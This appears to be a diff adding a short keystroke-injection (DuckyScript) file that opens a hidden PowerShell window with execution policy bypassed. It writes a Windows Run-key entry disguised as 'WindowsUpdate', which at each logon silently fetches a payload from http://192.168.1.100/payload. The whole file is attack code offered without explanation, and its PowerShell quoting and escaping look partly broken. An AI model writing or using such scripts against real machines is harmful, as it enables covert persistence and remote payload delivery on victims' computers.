@@ -1,0 +1,15 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Registry persistence
+$string = @"
+`$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+`$regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri 'http://192.168.1.100/payload' -UseBasicParsing`""
+New-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value $regValue -Force
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
